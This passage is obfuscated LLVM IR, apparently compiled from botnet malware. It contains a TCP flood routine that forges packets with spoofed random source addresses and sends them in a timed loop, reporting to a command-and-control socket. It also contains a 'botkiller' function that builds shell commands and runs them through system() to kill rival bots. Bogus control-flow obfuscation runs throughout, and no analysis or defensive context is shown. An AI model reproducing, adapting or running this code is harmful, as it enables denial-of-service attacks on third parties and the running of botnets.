  %366 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  %368 = bitcast %union.anon.0* %367 to %struct.anon.1*
  %369 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %368, i32 0, i32 4
  %370 = load i16, i16* %369, align 4
  %371 = and i16 %370, -2049
  %372 = or i16 %371, 2048
  store i16 %372, i16* %369, align 4
  %373 = load i32, i32* @x.101
  %374 = load i32, i32* @y.102
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart2149, label %originalBB141alteredBB

originalBBpart2149:                               ; preds = %originalBB141
  br label %385

; <label>:381:                                    ; preds = %originalBBpart2139
  %382 = load i32, i32* @mainCommSock, align 4
  %383 = load i8*, i8** %23, align 8
  %384 = call i32 (i32, i8*, ...) @sockprintf(i32 %382, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.423, i32 0, i32 0), i8* %383)
  br label %385

; <label>:385:                                    ; preds = %381, %originalBBpart2149
  %386 = load i32, i32* @x.101
  %387 = load i32, i32* @y.102
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %385
  %394 = load i32, i32* @x.101
  %395 = load i32, i32* @y.102
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart2153, label %originalBB151alteredBB

originalBBpart2153:                               ; preds = %originalBB151
  br label %402

; <label>:402:                                    ; preds = %originalBBpart2153, %originalBBpart2135
  br label %403

; <label>:403:                                    ; preds = %402, %originalBBpart2111
  br label %404

; <label>:404:                                    ; preds = %403, %257
  br label %405

; <label>:405:                                    ; preds = %404, %originalBBpart2100
  %406 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %406, i8** %23, align 8
  br label %222

; <label>:407:                                    ; preds = %222
  br label %408

; <label>:408:                                    ; preds = %407, %originalBBpart291
  %409 = call i32 @rand_cmwc()
  %410 = trunc i32 %409 to i16
  %411 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 0
  %413 = bitcast %union.anon.0* %412 to %struct.anon.1*
  %414 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %413, i32 0, i32 5
  store i16 %410, i16* %414, align 2
  %415 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 0
  %417 = bitcast %union.anon.0* %416 to %struct.anon.1*
  %418 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %417, i32 0, i32 6
  store i16 0, i16* %418, align 4
  %419 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  %421 = bitcast %union.anon.0* %420 to %struct.anon.1*
  %422 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %421, i32 0, i32 7
  store i16 0, i16* %422, align 2
  %423 = load i32, i32* %9, align 4
  %424 = icmp eq i32 %423, 0
  br i1 %424, label %425, label %427

; <label>:425:                                    ; preds = %408
  %426 = call i32 @rand_cmwc()
  br label %432

; <label>:427:                                    ; preds = %408
  %428 = load i32, i32* %9, align 4
  %429 = trunc i32 %428 to i16
  %430 = call zeroext i16 @htons(i16 zeroext %429) #13
  %431 = zext i16 %430 to i32
  br label %432

; <label>:432:                                    ; preds = %427, %425
  %433 = phi i32 [ %426, %425 ], [ %431, %427 ]
  %434 = trunc i32 %433 to i16
  %435 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  %437 = bitcast %union.anon.0* %436 to %struct.anon.1*
  %438 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %437, i32 0, i32 1
  store i16 %434, i16* %438, align 2
  %439 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %440 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %441 = call zeroext i16 @tcpcsum(%struct.iphdr* %439, %struct.tcphdr* %440)
  %442 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 0
  %444 = bitcast %union.anon.0* %443 to %struct.anon.1*
  %445 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %444, i32 0, i32 6
  store i16 %441, i16* %445, align 4
  %446 = bitcast i8* %125 to i16*
  %447 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 2
  %449 = load i16, i16* %448, align 2
  %450 = zext i16 %449 to i32
  %451 = call zeroext i16 @csum(i16* %446, i32 %450)
  %452 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 7
  store i16 %451, i16* %453, align 2
  %454 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %455 = load i32, i32* %10, align 4
  %456 = add nsw i32 %454, %455
  store i32 %456, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %457

; <label>:457:                                    ; preds = %originalBBpart2167, %509, %432
  br label %458

; <label>:458:                                    ; preds = %457
  %459 = load i32, i32* %17, align 4
  %460 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %461 = call i64 @sendto(i32 %459, i8* %125, i64 %123, i32 0, %struct.sockaddr* %460, i32 16)
  %462 = load i32, i32* %19, align 4
  %463 = call i32 @getRandomIP(i32 %462)
  %464 = call i32 @htonl(i32 %463) #13
  %465 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 8
  store i32 %464, i32* %466, align 4
  %467 = call i32 @rand_cmwc()
  %468 = trunc i32 %467 to i16
  %469 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 3
  store i16 %468, i16* %470, align 4
  %471 = call i32 @rand_cmwc()
  %472 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 0
  %474 = bitcast %union.anon.0* %473 to %struct.anon.1*
  %475 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %474, i32 0, i32 2
  store i32 %471, i32* %475, align 4
  %476 = call i32 @rand_cmwc()
  %477 = trunc i32 %476 to i16
  %478 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %479 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %478, i32 0, i32 0
  %480 = bitcast %union.anon.0* %479 to %struct.anon.1*
  %481 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %480, i32 0, i32 0
  store i16 %477, i16* %481, align 4
  %482 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 0
  %484 = bitcast %union.anon.0* %483 to %struct.anon.1*
  %485 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %484, i32 0, i32 6
  store i16 0, i16* %485, align 4
  %486 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %487 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %488 = call zeroext i16 @tcpcsum(%struct.iphdr* %486, %struct.tcphdr* %487)
  %489 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 0
  %491 = bitcast %union.anon.0* %490 to %struct.anon.1*
  %492 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %491, i32 0, i32 6
  store i16 %488, i16* %492, align 4
  %493 = bitcast i8* %125 to i16*
  %494 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 2
  %496 = load i16, i16* %495, align 2
  %497 = zext i16 %496 to i32
  %498 = call zeroext i16 @csum(i16* %493, i32 %497)
  %499 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 7
  store i16 %498, i16* %500, align 2
  %501 = load i32, i32* %25, align 4
  %502 = load i32, i32* %15, align 4
  %503 = icmp eq i32 %501, %502
  br i1 %503, label %504, label %510

; <label>:504:                                    ; preds = %458
  %505 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %506 = load i32, i32* %24, align 4
  %507 = icmp sgt i32 %505, %506
  br i1 %507, label %508, label %509

; <label>:508:                                    ; preds = %504
  br label %529

; <label>:509:                                    ; preds = %504
  store i32 0, i32* %25, align 4
  br label %457

; <label>:510:                                    ; preds = %458
  %511 = load i32, i32* @x.101
  %512 = load i32, i32* @y.102
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %510
  %519 = load i32, i32* %25, align 4
  %520 = add i32 %519, 1
  store i32 %520, i32* %25, align 4
  %521 = load i32, i32* @x.101
  %522 = load i32, i32* @y.102
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBBpart2167, label %originalBB155alteredBB

originalBBpart2167:                               ; preds = %originalBB155
  br label %457

; <label>:529:                                    ; preds = %508
  %530 = load i32, i32* @x.101
  %531 = load i32, i32* @y.102
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBB169, label %originalBB169alteredBB

originalBB169:                                    ; preds = %originalBB169alteredBB, %529
  %538 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %538)
  %539 = load i32, i32* @x.101
  %540 = load i32, i32* @y.102
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBBpart2171, label %originalBB169alteredBB

originalBBpart2171:                               ; preds = %originalBB169
  br label %547

; <label>:547:                                    ; preds = %originalBBpart2171, %91, %originalBBpart24, %60
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %39
  %548 = load i8*, i8** %8, align 8
  %549 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %550 = call i32 @getHost(i8* %548, %struct.in_addr* %549)
  %551 = icmp ne i32 %550, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  %552 = load i32, i32* @mainCommSock, align 4
  %553 = call i32 (i32, i8*, ...) @sockprintf(i32 %552, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  %554 = load i32, i32* %11, align 4
  %555 = icmp eq i32 %554, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %167
  %556 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 0
  %558 = bitcast %union.anon.0* %557 to %struct.anon.1*
  %559 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %558, i32 0, i32 4
  %560 = load i16, i16* %559, align 4
  %_ = shl i16 %560, -513
  %_11 = sub i16 %560, -513
  %gen = mul i16 %_11, -513
  %_12 = sub i16 %560, -513
  %gen13 = mul i16 %_12, -513
  %_14 = sub i16 %560, -513
  %gen15 = mul i16 %_14, -513
  %_16 = shl i16 %560, -513
  %561 = and i16 %560, -513
  %_17 = shl i16 %561, 512
  %_18 = shl i16 %561, 512
  %_19 = sub i16 0, %561
  %gen20 = add i16 %_19, 512
  %_21 = sub i16 %561, 512
  %gen22 = mul i16 %_21, 512
  %562 = or i16 %561, 512
  store i16 %562, i16* %559, align 4
  %563 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %564 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %563, i32 0, i32 0
  %565 = bitcast %union.anon.0* %564 to %struct.anon.1*
  %566 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %565, i32 0, i32 4
  %567 = load i16, i16* %566, align 4
  %_23 = sub i16 %567, -1025
  %gen24 = mul i16 %_23, -1025
  %_25 = sub i16 0, %567
  %gen26 = add i16 %_25, -1025
  %_27 = sub i16 %567, -1025
  %gen28 = mul i16 %_27, -1025
  %_29 = sub i16 %567, -1025
  %gen30 = mul i16 %_29, -1025
  %_31 = sub i16 %567, -1025
  %gen32 = mul i16 %_31, -1025
  %_33 = sub i16 %567, -1025
  %gen34 = mul i16 %_33, -1025
  %_35 = sub i16 %567, -1025
  %gen36 = mul i16 %_35, -1025
  %_37 = shl i16 %567, -1025
  %568 = and i16 %567, -1025
  %569 = or i16 %568, 1024
  store i16 %569, i16* %566, align 4
  %570 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 0
  %572 = bitcast %union.anon.0* %571 to %struct.anon.1*
  %573 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %572, i32 0, i32 4
  %574 = load i16, i16* %573, align 4
  %_38 = shl i16 %574, -257
  %_39 = shl i16 %574, -257
  %_40 = sub i16 %574, -257
  %gen41 = mul i16 %_40, -257
  %_42 = sub i16 %574, -257
  %gen43 = mul i16 %_42, -257
  %_44 = sub i16 %574, -257
  %gen45 = mul i16 %_44, -257
  %575 = and i16 %574, -257
  %_46 = sub i16 %575, 256
  %gen47 = mul i16 %_46, 256
  %_48 = shl i16 %575, 256
  %_49 = sub i16 %575, 256
  %gen50 = mul i16 %_49, 256
  %_51 = sub i16 0, %575
  %gen52 = add i16 %_51, 256
  %_53 = sub i16 0, %575
  %gen54 = add i16 %_53, 256
  %576 = or i16 %575, 256
  store i16 %576, i16* %573, align 4
  %577 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 0
  %579 = bitcast %union.anon.0* %578 to %struct.anon.1*
  %580 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %579, i32 0, i32 4
  %581 = load i16, i16* %580, align 4
  %_55 = sub i16 0, %581
  %gen56 = add i16 %_55, -4097
  %582 = and i16 %581, -4097
  %_57 = sub i16 %582, 4096
  %gen58 = mul i16 %_57, 4096
  %_59 = sub i16 %582, 4096
  %gen60 = mul i16 %_59, 4096
  %_61 = shl i16 %582, 4096
  %_62 = sub i16 0, %582
  %gen63 = add i16 %_62, 4096
  %583 = or i16 %582, 4096
  store i16 %583, i16* %580, align 4
  %584 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %585 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %584, i32 0, i32 0
  %586 = bitcast %union.anon.0* %585 to %struct.anon.1*
  %587 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %586, i32 0, i32 4
  %588 = load i16, i16* %587, align 4
  %_64 = sub i16 %588, -2049
  %gen65 = mul i16 %_64, -2049
  %_66 = sub i16 0, %588
  %gen67 = add i16 %_66, -2049
  %_68 = sub i16 0, %588
  %gen69 = add i16 %_68, -2049
  %_70 = shl i16 %588, -2049
  %_71 = sub i16 %588, -2049
  %gen72 = mul i16 %_71, -2049
  %_73 = sub i16 %588, -2049
  %gen74 = mul i16 %_73, -2049
  %_75 = sub i16 %588, -2049
  %gen76 = mul i16 %_75, -2049
  %589 = and i16 %588, -2049
  %_77 = sub i16 %589, 2048
  %gen78 = mul i16 %_77, 2048
  %_79 = sub i16 0, %589
  %gen80 = add i16 %_79, 2048
  %_81 = shl i16 %589, 2048
  %_82 = sub i16 %589, 2048
  %gen83 = mul i16 %_82, 2048
  %_84 = sub i16 %589, 2048
  %gen85 = mul i16 %_84, 2048
  %_86 = sub i16 %589, 2048
  %gen87 = mul i16 %_86, 2048
  %_88 = shl i16 %589, 2048
  %_89 = shl i16 %589, 2048
  %590 = or i16 %589, 2048
  store i16 %590, i16* %587, align 4
  br label %originalBB10

originalBB93alteredBB:                            ; preds = %originalBB93, %229
  %591 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %592 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %591, i32 0, i32 0
  %593 = bitcast %union.anon.0* %592 to %struct.anon.1*
  %594 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %593, i32 0, i32 4
  %595 = load i16, i16* %594, align 4
  %_94 = sub i16 %595, -513
  %gen95 = mul i16 %_94, -513
  %596 = and i16 %595, -513
  %_96 = shl i16 %596, 512
  %_97 = sub i16 %596, 512
  %gen98 = mul i16 %_97, 512
  %597 = or i16 %596, 512
  store i16 %597, i16* %594, align 4
  br label %originalBB93

originalBB102alteredBB:                           ; preds = %originalBB102, %269
  %598 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 0
  %600 = bitcast %union.anon.0* %599 to %struct.anon.1*
  %601 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %600, i32 0, i32 4
  %602 = load i16, i16* %601, align 4
  %_103 = sub i16 0, %602
  %gen104 = add i16 %_103, -257
  %603 = and i16 %602, -257
  %_105 = sub i16 0, %603
  %gen106 = add i16 %_105, 256
  %_107 = shl i16 %603, 256
  %_108 = sub i16 %603, 256
  %gen109 = mul i16 %_108, 256
  %604 = or i16 %603, 256
  store i16 %604, i16* %601, align 4
  br label %originalBB102

originalBB113alteredBB:                           ; preds = %originalBB113, %293
  %605 = load i8*, i8** %23, align 8
  %606 = call i32 @strcmp(i8* %605, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.421, i32 0, i32 0)) #10
  %607 = icmp ne i32 %606, 0
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %313
  %608 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %609 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %608, i32 0, i32 0
  %610 = bitcast %union.anon.0* %609 to %struct.anon.1*
  %611 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %610, i32 0, i32 4
  %612 = load i16, i16* %611, align 4
  %_118 = shl i16 %612, -4097
  %_119 = shl i16 %612, -4097
  %_120 = sub i16 0, %612
  %gen121 = add i16 %_120, -4097
  %_122 = shl i16 %612, -4097
  %613 = and i16 %612, -4097
  %_123 = shl i16 %613, 4096
  %_124 = sub i16 0, %613
  %gen125 = add i16 %_124, 4096
  %_126 = sub i16 0, %613
  %gen127 = add i16 %_126, 4096
  %_128 = sub i16 0, %613
  %gen129 = add i16 %_128, 4096
  %_130 = sub i16 0, %613
  %gen131 = add i16 %_130, 4096
  %_132 = sub i16 %613, 4096
  %gen133 = mul i16 %_132, 4096
  %614 = or i16 %613, 4096
  store i16 %614, i16* %611, align 4
  br label %originalBB117

originalBB137alteredBB:                           ; preds = %originalBB137, %337
  %615 = load i8*, i8** %23, align 8
  %616 = call i32 @strcmp(i8* %615, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.422, i32 0, i32 0)) #10
  %617 = icmp ne i32 %616, 0
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %357
  %618 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %619 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %618, i32 0, i32 0
  %620 = bitcast %union.anon.0* %619 to %struct.anon.1*
  %621 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %620, i32 0, i32 4
  %622 = load i16, i16* %621, align 4
  %_142 = sub i16 %622, -2049
  %gen143 = mul i16 %_142, -2049
  %_144 = sub i16 0, %622
  %gen145 = add i16 %_144, -2049
  %623 = and i16 %622, -2049
  %_146 = sub i16 %623, 2048
  %gen147 = mul i16 %_146, 2048
  %624 = or i16 %623, 2048
  store i16 %624, i16* %621, align 4
  br label %originalBB141

originalBB151alteredBB:                           ; preds = %originalBB151, %385
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %510
  %625 = load i32, i32* %25, align 4
  %_156 = sub i32 %625, 1
  %gen157 = mul i32 %_156, 1
  %_158 = sub i32 0, %625
  %gen159 = add i32 %_158, 1
  %_160 = shl i32 %625, 1
  %_161 = sub i32 %625, 1
  %gen162 = mul i32 %_161, 1
  %_163 = sub i32 0, %625
  %gen164 = add i32 %_163, 1
  %_165 = shl i32 %625, 1
  %626 = add i32 %625, 1
  store i32 %626, i32* %25, align 4
  br label %originalBB155

originalBB169alteredBB:                           ; preds = %originalBB169, %529
  %627 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %627)
  br label %originalBB169
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca [10 x i8*], align 16
  %2 = alloca [23 x i8*], align 16
  %3 = alloca [16 x i8*], align 16
  %4 = alloca [80 x i8], align 16
  %5 = alloca [80 x i8], align 16
  %6 = alloca [128 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = bitcast [10 x i8*]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %10, i8* bitcast ([10 x i8*]* @botkiller.teldirs to i8*), i64 80, i32 16, i1 false)
  %11 = bitcast [23 x i8*]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %11, i8* bitcast ([23 x i8*]* @botkiller.Boats to i8*), i64 184, i32 16, i1 false)
  %12 = bitcast [16 x i8*]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %12, i8* bitcast ([16 x i8*]* @botkiller.bots to i8*), i64 128, i32 16, i1 false)
  store i32 0, i32* %9, align 4
  br label %13

; <label>:13:                                     ; preds = %originalBBpart24, %0
  %14 = load i32, i32* %9, align 4
  %15 = load i32, i32* %8, align 4
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %17, label %105

; <label>:17:                                     ; preds = %13
  %18 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 128, i32 16, i1 false)
  %19 = load i32, i32* %9, align 4
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %44

; <label>:21:                                     ; preds = %17
  %22 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %23 = load i32, i32* %9, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = load i32, i32* %9, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = load i32, i32* %9, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %32
  %34 = load i8*, i8** %33, align 8
  %35 = load i32, i32* %9, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = load i32, i32* %9, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [16 x i8*], [16 x i8*]* %3, i64 0, i64 %40
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %22, i64 127, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.455, i32 0, i32 0), i8* %26, i8* %30, i8* %34, i8* %38, i8* %42) #5
  br label %75

; <label>:44:                                     ; preds = %17
  %45 = load i32, i32* @x.103
  %46 = load i32, i32* @y.104
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %54 = load i32, i32* %9, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %55
  %57 = load i8*, i8** %56, align 8
  %58 = load i32, i32* %9, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %59
  %61 = load i8*, i8** %60, align 8
  %62 = load i32, i32* %9, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %63
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %53, i64 127, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.456, i32 0, i32 0), i8* %57, i8* %61, i8* %65) #5
  %67 = load i32, i32* @x.103
  %68 = load i32, i32* @y.104
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %75

; <label>:75:                                     ; preds = %originalBBpart2, %21
  %76 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %77 = call i32 @system(i8* %76)
  %78 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i32 0, i32 0
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [16 x i8*], [16 x i8*]* %3, i64 0, i64 %80
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 (i8*, i8*, ...) @sprintf(i8* %78, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.457, i32 0, i32 0), i8* %82) #5
  %84 = getelementptr inbounds [80 x i8], [80 x i8]* %5, i32 0, i32 0
  %85 = call i32 @system(i8* %84)
  br label %123
                                                  ; No predecessors!
  %87 = load i32, i32* @x.103
  %88 = load i32, i32* @y.104
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %86
  %95 = load i32, i32* %9, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %9, align 4
  %97 = load i32, i32* @x.103
  %98 = load i32, i32* @y.104
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %13

; <label>:105:                                    ; preds = %13
  %106 = load i32, i32* @x.103
  %107 = load i32, i32* @y.104
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %105
  %114 = call i32 @sleep(i32 5)
  %115 = load i32, i32* @x.103
  %116 = load i32, i32* @y.104
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %123

; <label>:123:                                    ; preds = %originalBBpart28, %75
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  %124 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i32 0, i32 0
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [10 x i8*], [10 x i8*]* %1, i64 0, i64 %126
  %128 = load i8*, i8** %127, align 8
  %129 = load i32, i32* %9, align 4
